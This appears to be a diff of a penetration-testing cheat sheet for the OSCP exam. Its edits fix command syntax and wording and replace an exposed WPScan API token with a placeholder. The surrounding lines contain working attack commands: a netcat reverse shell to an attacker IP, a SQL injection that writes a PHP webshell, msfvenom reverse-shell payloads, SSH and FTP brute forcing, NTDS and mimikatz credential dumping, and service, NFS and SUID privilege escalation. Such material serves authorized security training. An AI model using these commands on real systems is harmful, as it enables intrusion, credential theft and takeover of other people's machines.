@@ -33,19 +33,19 @@ alias build="mkdir files exploits && touch hashes users passwords"
 alias powerenc="python3 /home/sathvik/Tools/power-reverseshell.py"
 alias getexploit="searchsploit -m"
 alias nmapautomator="bash /opt/nmapautomator.sh"
-alias gobuster="gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt"
-alias nikto="nikto -h $URL"
-alias smbclient="smbclient -L //$IP"
-alias hydra="hydra -L users.txt -P passwords.txt $IP -t 4 ssh"
-alias dirsearch="python3 /opt/dirsearch/dirsearch.py -u $URL -e php,html"
-alias nc="nc -lvnp $LPORT"
+alias gobuster='gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt'
+alias nikto='nikto -h $URL'
+alias smbclient='smbclient -L //$IP'
+alias hydra='hydra -L users.txt -P passwords.txt $IP -t 4 ssh'
+alias dirsearch='python3 /opt/dirsearch/dirsearch.py -u $URL -e php,html'
+alias nc='nc -lvnp $LPORT'
 alias msfconsole="msfconsole -q"
-alias curlx="curl -X GET $URL"
-alias pyserv="python3 -m http.server $LPORT"
+alias curlx='curl -X GET $URL'
+alias pyserv='python3 -m http.server $LPORT'
 alias sshkeygen="ssh-keygen -t rsa -b 4096"
 alias exiftool="exiftool"
 alias john="john --wordlist=rockyou.txt"
-alias sqlmap="sqlmap -u $URL --batch --random-agent"
+alias sqlmap='sqlmap -u $URL --batch --random-agent'
 alias wget="wget -r -np -R 'index.html*'"
 
 ```
@@ -461,17 +461,17 @@ xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login do
 
 - This can be used to get ssh session, on target machine which is based on linux
 
-```jsx
-ssh-keygen -t rsa -b 4096 #give any password
+```bash
+ssh-keygen -t ed25519 #enter a passphrase when prompted
 
-#This created both id_rsa and id_rsa.pub in ~/.ssh directory
-#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
+#This creates id_ed25519 and id_ed25519.pub in ~/.ssh by default.
+#Copy the content of id_ed25519.pub to the target user's authorized_keys file.
 chmod 700 ~/.ssh
 nano ~/.ssh/authorized_keys #enter the copied content here
-chmod 600 ~/.ssh/authorized_keys 
+chmod 600 ~/.ssh/authorized_keys
 
 #On Attacker machine
-ssh username@target_ip #enter password if you gave any
+ssh -i ~/.ssh/id_ed25519 username@target_ip #enter the key passphrase if you set one
 ```
 
 ## File Transfers
@@ -497,9 +497,9 @@ copy \\kali\share\file .
 
 - Downloading on Linux
 
-```powershell
+```bash
 wget http://lhost/file
-curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+curl -o <OUTPUT_FILE> http://<LHOST>/<FILE>
 ```
 
 ### Windows to Kali
@@ -521,9 +521,9 @@ net localgroup "Remote Desktop Users" hacker /ADD
 
 ### Linux
 
-```powershell
+```bash
 adduser <uname> #Interactive
-useradd <uname>
+useradd -m <uname>
 
 useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
 ```
@@ -531,7 +531,7 @@ useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, th
 ## Password-Hash Cracking
 
 *Hash Analyzer*: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)  </br>
-## Password file saw in offsec discord 500-worst-passwords.txt 
+## Password list mentioned in the OffSec Discord: 500-worst-passwords.txt
 ### Hash Identifier
 - Identify the hash types using these tools
 ```powershell
@@ -579,7 +579,7 @@ hashcat -m <number> hash wordlists.txt --force
 ## Pivoting through SSH
 
 ```bash
-ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port
+ssh -i id_rsa -D 9050 adminuser@10.10.155.5 #SOCKS proxy port
 
 #Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
 
@@ -794,12 +794,12 @@ hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ft
 #Login
 ssh uname@IP #enter password in the prompt
 
-#id_rsa or id_ecdsa file
-chmod 600 id_rsa/id_ecdsa
-ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John
+#Use the private key file you obtained, for example id_rsa or id_ecdsa
+chmod 600 id_rsa
+ssh -i id_rsa uname@IP #if it still asks for a password, crack the key passphrase using John
 
 #cracking id_rsa or id_ecdsa
-ssh2john id_ecdsa(or)id_rsa > hash
+ssh2john id_ecdsa > hash #replace id_ecdsa with the actual private key filename
 john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash
 
 #bruteforce
@@ -828,7 +828,7 @@ crackmapexec smb 192.168.1.100 -u username -p password
 crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
 crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
 crackmapexec smb 192.168.1.100 -u username -p password --all #all information
-crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
+crackmapexec smb 192.168.1.100 -u username -p password --port 445 --shares #specific port
 crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
 #Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
 
@@ -908,11 +908,11 @@ curl -i http://192.168.50.16:5002/users/v1
 # basic usage
 wpscan --url "target" --verbose
 
-# enumerate vulnerable plugins, users, vulrenable themes, timthumbs
+# enumerate vulnerable plugins, users, vulnerable themes, and Timthumbs
 wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
 
-# Add Wpscan API to get the details of vulnerabilties.
-wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA 
+# Add a WPScan API token to get vulnerability details. Never commit a real token.
+wpscan --url http://alvida-eatery.org/ --api-token <WPScan_API_TOKEN>
 
 #Accessing Wordpress shell
 http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro
@@ -1091,7 +1091,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 ## Local File Inclusion
 
-- Main difference between Directory traversal and this attack is, here we’re able to execute commands remotely.
+- Directory traversal reads files outside the intended directory. LFI makes the application include a local file; it does not inherently provide code execution. Code execution may become possible in specific cases, such as log poisoning or an unsafe PHP wrapper.
 
 ```powershell
 #At first we need 
@@ -1165,7 +1165,7 @@ EXECUTE xp_cmdshell 'whoami';
 #Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
 #Now we can exploit it
-http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
+http://192.168.45.125/tmp/webshell.php?cmd=id #Command execution
 ```
 
 - SQLMap - Automated Code execution
@@ -1317,7 +1317,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ```powershell
 #Identify service from winpeas
-icalcs "path" #F means full permission, we need to check we have full access on folder
+icacls "path" #F means full permission, we need to check we have full access on folder
 sc qc <servicename> #find binarypath variable
 sc config <service> <option>="<value>" #change the path to the reverseshell location
 sc start <servicename>
@@ -1328,7 +1328,7 @@ sc start <servicename>
 ```bash
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
 #Check the Writable path
-icalcs "path"
+icacls "path"
 #Insert the payload in writable location and which works.
 sc start <servicename>
 ```
@@ -1417,7 +1417,7 @@ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 
 #Check the location is writable
-accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
+accesschk.exe -accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
 
 #Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell
 ```
@@ -1436,12 +1436,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform win
 msiexec /quiet /qn /i reverse.msi
 ```
 
-## Schedules Tasks
+## Scheduled Tasks
 
 ```bash
 schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
 #Permission check - Writable means exploitable!
-icalcs "path"
+icacls "path"
 #Wait till the scheduled task in executed, then we'll get a shell
 ```
 
@@ -1545,7 +1545,7 @@ reg query "HKCU\Software\TightVNC\Server"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
 
-### SNMP Paramters  
+### SNMP Parameters
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  
 
 ### Putty  
@@ -1632,7 +1632,7 @@ cat /etc/fstab
 mount
 lsblk
 lsmod
->/sbin/modinfo liata (# libata found in the above command)
+/sbin/modinfo libata #libata found in the output of lsmod
 find / -perm -u=s -type f 2>/dev/null
 strings file_read(Read file)
 which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp git 2>/dev/null
@@ -1665,15 +1665,14 @@ which bash sh awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp f
     - `find / -type f -perm 0777` : find files with the 777 permissions (files readable, writable, and executable by all users)
     - `find / -perm a=x` : find executable files
     - `find /home -user frank` : find all files for user “frank” under “/home”
-    - `find / -mtime 10` : find files that were modified in the last 10 days
-    - `find / -atime 10` : find files that were accessed in the last 10 day
+    - `find / -mtime -10` : find files that were modified in the last 10 days
+    - `find / -atime -10` : find files that were accessed in the last 10 days
     - `find / -cmin -60` : find files changed within the last hour (60 minutes)
     - `find / -amin -60` : find files accesses within the last hour (60 minutes)
     - `find / -size 50M` : find files with a 50 MB size
-    - `find / -writable -type d 2>/dev/null` : Find world-writeable folders
-    - `find / -perm -222 -type d 2>/dev/null` : Find world-writeable folders
-    - `find / -perm -o w -type d 2>/dev/null` : Find world-writeable folders
-    - `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
+    - `find / -writable -type d 2>/dev/null` : find directories writable by the current user
+    - `find / -perm -0002 -type d 2>/dev/null` : find world-writable directories
+    - `find / -perm -0001 -type d 2>/dev/null` : find world-executable directories
     - We can also find programming languages and supported languages: `find / -name perl*`, `find / -name python*`, `find / -name gcc*` ...etc
     - `find / -perm -u=s -type f 2>/dev/null` : Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. This is important!
 
@@ -1758,11 +1757,11 @@ nc <attacker-ip> <port> -e /bin/bash
 ## NFS
 
 - In order to view the configuration of NFS run `cat /etc/exports` or also we can type `showmount -e <target IP>` on our machine to find the **mountable shares**.
-- In the output look for directories having `no_root_squash`, this means that the particular share is _writable_, hence we can do something to acquires root!
+- In the output, look for exports using `no_root_squash`. This preserves the client root user's UID instead of mapping it to an anonymous user; the export must also be writable for the usual SUID-file technique to work.
 - Now after getting some directories where we can play around lets navigate to our attacker machine and create a sample directory anywhere like `/tmp`...etc
 - Now we need to mount to the target machine by, `mount -o rw <targetIP>:<share-location> <directory path we created>`, here `rw` means read, write privileges.
 - Now go to the folder we created and create a binary which gives us root on running.
-- Then go back to the target machine and we can view the binary we created in the place we mounted, now run that and get root privileges!(do note that giving executable rights is not sufficient, we also need to give share rights by `chmod +s <binary>`)
+- Then go back to the target machine and run the binary from the exported directory. Making it executable is not sufficient: the binary must be owned by root and have its owner SUID bit set, for example with `chmod u+s <binary>` from the client root context.
 - Then we're good to go!
   
 ```bash
@@ -1851,7 +1850,7 @@ type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 ### Searching for passwords
 
 ```powershell
-dir .s *pass* == *.config
+dir /s *pass* *.config
 findstr /si password *.xml *.ini *.txt
 ```
 
@@ -1905,7 +1904,7 @@ net localgroup Administrators #to check local admins
 Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
 Get-NetDomain #basic information about the domain
 Get-NetUser #list of all users in the domain
-# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
+# The output can be filtered with Select-Object. For example, `Get-NetUser | Select-Object cn`; multiple properties can be separated by commas.
 Get-NetGroup # enumerate domain groups
 Get-NetGroup "group name" # information from specific group
 Get-NetComputer # enumerate the computer objects in the domain
@@ -1999,7 +1998,7 @@ Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
 Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 
 # pass-the-hash (with an NT hash)
-Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER'@'DOMAIN_CONTROLLER'
 
 # parse a local file
 Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
@@ -2202,7 +2201,7 @@ crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
 
 #crackmapexec modules
 crackmapexec smb -L #listing modules
-crackmapexec smb -M mimikatx --options #shows the required options for the module
+crackmapexec smb -M mimikatz --options #shows the required options for the module
 crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
 crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
 ```
@@ -2221,10 +2220,10 @@ netexec <protocol> <target(s)> -u username1 -p password1 password2
 netexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
 sudo nxc smb <TARGET> -k -u USER -p PASS
 ```
-### kpcli - keepass massword manager
+### kpcli - KeePass password manager
 Found the Database.kdbx file in the smb enumeration
 ```
-smbclient -L \\<TARGET>
+smbclient -L //<TARGET>
 smb shell> smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
 keepass2john Database.kdbx > keepass.hash
 hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule (#Password - welcome)
@@ -2297,9 +2296,9 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 reg.exe save hklm\system c:\system.bak
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
-##Windows Powershell payload encrypt </br>
+## Windows PowerShell payload encoding
 <a href="https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
-">Gihhub Link</a>
+">GitHub link</a>
 <a href="https://discord.com/channels/780824470113615893/1087927556604432424/1271916461442728098"> Discord Chat</a>
 ```powershell 
 #!/usr/bin/env python3
